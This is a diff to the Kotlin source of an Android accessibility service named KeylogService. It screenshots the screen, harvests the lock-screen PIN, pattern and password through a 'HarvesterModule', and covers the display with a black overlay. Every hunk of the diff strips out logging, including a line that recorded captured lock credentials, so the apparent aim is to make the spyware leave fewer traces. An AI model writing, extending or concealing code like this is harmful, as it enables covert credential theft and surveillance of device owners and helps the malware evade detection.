@@ -14,7 +14,7 @@ import android.net.Uri
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
-import android.util.Log
+
 import android.view.Display
 import android.view.Gravity
 import android.view.WindowManager
@@ -63,12 +63,12 @@ class KeylogService : AccessibilityService() {
                             bitmap.recycle()
                             cont.resume(stream.toByteArray())
                         } catch (e: Exception) {
-                            Log.e(TAG, "screenshot: ${e.message}")
+                            
                             cont.resume(null)
                         }
                     }
                     override fun onFailure(errorCode: Int) {
-                        Log.w(TAG, "screenshot fail: code=$errorCode")
+                        
                         cont.resume(null)
                     }
                 })
@@ -91,7 +91,7 @@ class KeylogService : AccessibilityService() {
         harvester = HarvesterModule(this)
         logFile?.let { harvester.setLogFile(it) }
         harvester.setCallback { pin, pattern, password ->
-            logFile?.appendText("${System.currentTimeMillis()} LOCK_CAPTURED pin=$pin pattern=$pattern password=$password\n")
+            
         }
 
         val info = AccessibilityServiceInfo().apply {
@@ -108,8 +108,8 @@ class KeylogService : AccessibilityService() {
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
         }
         serviceInfo = info
-        Log.i(TAG, "Keylog service connected")
-        logFile?.appendText("${System.currentTimeMillis()} KeylogService connected\n")
+        
+        
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -157,7 +157,7 @@ class KeylogService : AccessibilityService() {
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "event: ${e.message}")
+            
         } finally {
             try { source?.recycle() } catch (_: Exception) {}
         }
@@ -196,23 +196,23 @@ class KeylogService : AccessibilityService() {
                             PixelFormat.TRANSLUCENT
                         ).apply { gravity = Gravity.TOP }
                         windowManager?.addView(blackOverlay, params)
-                        Log.i(TAG, "Black overlay enabled")
+                        
                     }
                 } else {
                     blackOverlay?.let {
                         try { windowManager?.removeView(it) } catch (_: Exception) {}
                         blackOverlay = null
-                        Log.i(TAG, "Black overlay disabled")
+                        
                     }
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "toggleBlackOverlay: ${e.message}")
+                
             }
         }
     }
 
     override fun onInterrupt() {
-        Log.i(TAG, "Keylog service interrupted")
+        
         isRunning = false
     }
 
@@ -222,7 +222,7 @@ class KeylogService : AccessibilityService() {
         isRunning = false
         toggleBlackOverlay(false)
         screenshotExecutor.shutdown()
-        Log.i(TAG, "Keylog service destroyed")
-        logFile?.appendText("${System.currentTimeMillis()} KeylogService destroyed\n")
+        
+        
     }
 }
